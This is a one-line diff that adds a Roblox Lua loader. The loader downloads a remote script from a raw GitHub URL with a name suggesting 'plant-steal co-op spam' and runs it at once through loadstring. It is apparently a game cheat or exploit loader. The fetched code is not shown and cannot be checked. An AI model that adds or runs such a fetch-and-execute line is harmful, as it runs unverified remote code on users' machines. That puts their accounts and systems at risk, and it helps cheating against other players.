@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LengthRescuer49/loaders/main/loaders/plant-steal-co-op-spam5-b7jolusqlpiv5g.lua"))()
